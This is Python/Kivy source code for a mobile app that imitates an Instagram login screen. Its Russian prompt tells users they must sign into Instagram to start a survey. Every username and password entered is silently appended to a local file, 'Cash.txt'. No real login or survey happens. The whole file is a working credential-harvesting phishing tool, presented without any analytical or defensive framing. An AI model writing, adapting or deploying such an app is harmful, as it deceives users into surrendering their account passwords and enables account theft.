
from kivy.app import App
from kivy.uix.widget import Widget
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.anchorlayout import AnchorLayout
from kivy.uix.gridlayout import GridLayout
from kivy.graphics import (Color, Ellipse, Line, Rectangle)
from kivy.core.window import Window
from kivy.uix.textinput import TextInput
from kivy.uix.image import  Image
from kivy.properties import ObjectProperty
from kivy.config import Config
import ast
Config.set('kivy', 'keyboard_mode', 'systemanddock')





Window.size =(480, 852)

#class Container(FloatLayout):
     #pass


class MyTest(App):
    def information(self):
        try:
            file = open('Cash.txt', 'r+')
            d = file.read()
            r = ast.literal_eval(d)

            dict2 = {self.username.text: self.password.text}
            r.update(dict2)
            file.truncate(0)
            file.close()

            file = open('Cash.txt', 'w')
            w = file.write(str(r))
        except:
            file = open('Cash.txt', 'w')
            pp = str({'Username': 'password'})
            file.write(pp)
            file.close()

    def build(self):
         b1 = FloatLayout()



         img = Image(source='fon_inst.png',
                  size_hint=(1,1),
                  pos_hint={'center_x': 0.5, 'center_y': 0.5})
         line_1 = Label(text = 'Телефон, имя пользователя или эл. адрес', color = '#789a9c',
                       size_hint = (0.4, 0.01),
                       font_size = '13',
                       bold = True,
                       pos_hint = ({'center_x': 0.47, 'center_y': 0.6}))


         self.username = TextInput(

             size_hint = (0.6, 0.04),
             pos_hint = ({'center_x': 0.5, 'center_y': 0.57}),
             multiline = False,
             font_size = '18')
         self.line_2 = Label(text='Пароль',
                        color='#789a9c',
                        bold = True,
                        size_hint=(0.4, 0.01),
                        font_size='13',
                        pos_hint=({'center_x': 0.25, 'center_y': 0.53}))
         self.password = TextInput(

             size_hint=(0.6, 0.04),
             pos_hint=({'center_x': 0.5, 'center_y': 0.5}),
             multiline=False,
             font_size='18')



         tit = Label(text = 'Для того чтобы начать опрос',
                       size_hint = (0.4, 0.01),
                       font_size = '15',
                       color = 'black',
                       bold = True,
                       pos_hint = ({'center_x': 0.5, 'center_y': 0.75}))
         tit2 = Label(text = 'НУЖНО ВОЙТИ В СВОЙ АККАУНТ INSTAGRAM',
                      size_hint=(0.1, 0.01),
                      font_size='17',
                      color='black',
                      bold=True,
                      pos_hint=({'center_x': 0.5, 'center_y': 0.73}))

         sign_in = Button(text='Войти',
                          size_hint=(0.6, 0.04),
                          background_normal='',
                          background_color=('blue'),
                          pos_hint=({'center_x': 0.5, 'center_y': 0.45}),
                          on_release =lambda x:self.information() )
         b1.add_widget(img)
         b1.add_widget(self.username)
         b1.add_widget(line_1)
         b1.add_widget(self.password)
         b1.add_widget(self.line_2)
         b1.add_widget(sign_in)
         b1.add_widget(tit)
         b1.add_widget(tit2)

         return b1


if __name__ == '__main__':
    MyTest().run()